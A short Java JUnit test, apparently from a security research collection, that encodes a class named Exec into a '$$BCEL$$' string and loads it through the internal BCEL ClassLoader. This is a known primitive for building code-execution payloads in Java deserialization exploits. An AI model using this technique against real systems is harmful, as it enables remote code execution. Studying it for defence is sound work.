import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.junit.Test;

/**
 * @author Whoopsunix
 */
public class BCEL {
    @Test
    public void Encode() throws Exception{
        JavaClass javaClass = Repository.lookupClass(Exec.class);
        String s =  Utility.encode(javaClass.getBytes(),true);
        String bcelStr = "$$BCEL$$"+ s;
        System.out.println(bcelStr);
        Decode(bcelStr);
    }

    public void Decode(String s) throws Exception {
        new ClassLoader().loadClass(s).newInstance();
    }
}
